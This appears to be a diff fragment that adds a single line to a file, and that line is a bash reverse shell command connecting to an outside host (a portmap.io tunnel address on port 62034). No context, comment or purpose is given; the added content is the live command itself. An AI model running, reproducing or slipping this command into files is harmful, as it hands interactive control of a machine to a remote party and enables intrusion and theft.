@@ -1,0 +1,1 @@
+/bin/bash -i >& /dev/tcp/jagemeistar-62034.portmap.io/62034 0>&1
